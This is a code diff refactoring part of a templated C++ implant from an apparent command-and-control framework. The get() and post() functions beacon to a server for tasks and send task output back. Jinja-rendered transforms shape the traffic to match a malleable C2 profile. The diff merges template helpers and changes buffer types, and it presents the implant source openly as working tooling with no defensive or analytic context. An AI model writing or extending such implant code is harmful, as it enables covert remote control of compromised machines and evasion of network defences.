@@ -25,22 +25,19 @@ Required Keys:
 #include "../data/transforms/transforms.h"
 #include "../data/msgpack/msgpack.h"
 
-[% from 'transform_output.j2' import render_transform_output -%]
-[% from 'transform_metadata.j2' import render_transform_metadata -%]
-[% from 'transform_id.j2' import render_transform_id -%]
+[% from 'transform.j2' import render_transform -%]
+[% from 'transform_reverse.j2' import render_reverse_transform -%]
 
-[% from 'transform_reverse_output.j2' import render_reverse_transform_output -%]
-[% from 'transform_reverse_metadata.j2' import render_reverse_transform_metadata -%]
-[% from 'transform_reverse_id.j2' import render_reverse_transform_id -%]
 
 nlohmann::json get(std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
-    std::vector<uint8_t> http_response_buffer;
+    std::string http_response_buffer;
 
     // Create metadata map
     std::map<std::string, std::string> metadata_map;
     metadata_map["implant_uuid"] = implant_uuid;
 
+    //this is fine as uint8_T vector for now
     std::vector<uint8_t> metadata_as_msgpack;
     create_metadata(metadata_map, metadata_as_msgpack);
 
@@ -50,8 +47,9 @@ nlohmann::json get(std::string implant_uuid) {
     std::vector<std::wstring> headers;
 
     // --- Transforms ---
+    //Transform metadata before it goes out to match the malleablec2 profile
     [%- for transform in http_get_client_metadata_transforms_list %]
-    [[ render_transform_metadata(transform) ]]
+    [[ render_transform(transform, 'metadata') ]]
     [%- endfor %]
     // --- End Transforms ---
 
@@ -66,20 +64,10 @@ nlohmann::json get(std::string implant_uuid) {
             return nullptr;
         }
 
-        //string of response var here
-        //TODO: Extract task from whatever field is specified
-        /*
-        jinja if that field...
-        else
-        */
-
-        //This variable should hold the output of the http request
-        std::string output;
-
-        // TODO: transform from raw data - NOTE! Use reverse funcs, as this is data coming back from server
         // --- Reverse Transforms ---
+        //Undo transform on data from server (which holds the task), as declared in malleable c2 profile
         [%- for transform in http_get_server_output_transforms_list %]
-        [[ render_reverse_transform_output(transform) ]]
+        [[ render_reverse_transform(transform, 'http_response_buffer') ]]
         [%- endfor %]
         // --- End Reverse Transforms ---
 
@@ -95,23 +83,26 @@ nlohmann::json get(std::string implant_uuid) {
 }
 
 int post(std::string implant_uuid, std::string output_data, std::string task_uuid) {
-    std::vector<uint8_t> task_response_msgpack;
 
     // Turn output data into msgpack
+    std::vector<uint8_t> task_response_msgpack;
     create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
 
     // Hold bytes in string, as all the transforms want a string
     std::string payload(task_response_msgpack.begin(), task_response_msgpack.end());
 
     // --- Transforms ---
-    [# Transform ID #]
+    //borked jinja stuff - deal with later to get id in 
+    // transform id
+    [# Passing 'payload' as the variable name #]
     [%- for transform in http_post_client_id_transforms_list %]
-    [[ render_transform_id(transform) ]]
+    [[ render_transform(transform, 'payload') ]]
     [%- endfor %]
 
+    // transform payload
     [# Transform Output #]
     [%- for transform in http_post_client_output_transforms_list %]
-    [[ render_transform_output(transform) ]]
+    [[ render_transform(transform, 'payload') ]]
     [%- endfor %]
     // --- End Transforms ---
 
@@ -141,7 +132,7 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     [%- endif %]
 
     // Send
-    std::vector<uint8_t> http_post_response_buffer;
+    std::string http_post_response_buffer;
     if (!HTTP_POST(payload_string, headers, http_post_response_buffer)) {
         std::cout << "Error occured posting data";
     };
